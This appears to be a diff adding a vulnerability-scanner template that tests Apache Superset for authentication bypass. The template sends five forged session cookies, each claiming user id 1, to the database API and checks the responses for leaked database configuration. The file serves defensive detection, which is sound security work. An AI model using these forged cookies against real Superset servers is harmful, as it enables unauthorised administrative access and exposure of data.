@@ -1,0 +1,67 @@
+id: APACHE_SUPERSET_AUTH_BYPASS
+info:
+  name: "Apache Superset Authentication Bypass Test"
+  description: "The Apache Superset Authentication Bypass Test examines vulnerabilities in Apache Superset, an open-source data exploration and visualization platform, where improper authentication mechanisms may allow unauthorized users to bypass login controls. If the application does not properly validate or secure user authentication tokens or session management, attackers may gain unauthorized access to sensitive data or administrative functions. This could result in data exposure, unauthorized actions, or complete system compromise. Strengthening authentication protocols and enforcing access control mechanisms are essential to mitigate such risks."
+  details:  "The Apache Superset Authentication Bypass Test assesses the security of authentication mechanisms in the Apache Superset platform, specifically looking for weaknesses that allow attackers to bypass login procedures. This can occur if there are flaws in session handling, authentication token validation, or improper configuration of authentication providers. Attackers could exploit these weaknesses to access the application without proper credentials, potentially gaining access to sensitive data or administrative privileges. To prevent this, it's important to enforce robust authentication measures, including multi-factor authentication, secure session management, and proper configuration of authentication plugins."
+  impact: "The impact of an Apache Superset Authentication Bypass vulnerability can be significant, as it could allow unauthorized users to access sensitive data, dashboards, and administrative functions without proper credentials. This could lead to data breaches, unauthorized manipulation of visualizations, and exposure of confidential information. Additionally, attackers could exploit the bypass to escalate privileges or perform malicious actions on the system. Implementing secure authentication mechanisms and access controls is crucial to prevent such risks and safeguard sensitive data."
+  category:
+    name: SM
+    shortName: Misconfiguration
+    displayName: Security Misconfiguration (SM)
+  subCategory: APACHE_SUPERSET_AUTH_BYPASS
+  severity: LOW
+  references:
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa8-security-misconfiguration.md"
+  cwe:
+    - CWE-200
+    - CWE-213
+  cve:
+    - CVE-2018-10245
+
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+wordLists:
+  path:
+    - '1'
+    - '2'
+    - '3'
+    - '4'
+    - '5'
+    - '6'
+    - '7'
+    - '9'
+    - '10'
+  session:
+    - 'eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKFnng.XPeCvkBiP7rOv1PhgKZ8xkzi2jk'
+    - 'eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKFu3g.k_WNoBY1ouhQyOXa5UcYdjVVuq0'
+    - 'eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKG_fg.KalpJbMq1SZPCBuunG9-ycDX9HM'
+    - 'eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKG_zQ.FPiBfT39gn2slf--XZHsk0rByEY'
+    - 'eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKHAPQ.zRjwotMHJES3eW8fJH8F_5GlD-U'
+execute:
+  type: single
+  requests:
+    - req:
+      - modify_url: "/api/v1/database/${path}"
+      - modify_method: GET
+      - replace_body: '{}'
+      - modify_header:
+          cookie: ${session}
+validate:
+  response_code:
+    eq: 200
+  response_payload:
+    length:
+      gt: 0
+    contains_all:
+      - '"database_name":'
+      - '"configuration_method":'
+strategy:
+  run_once: /
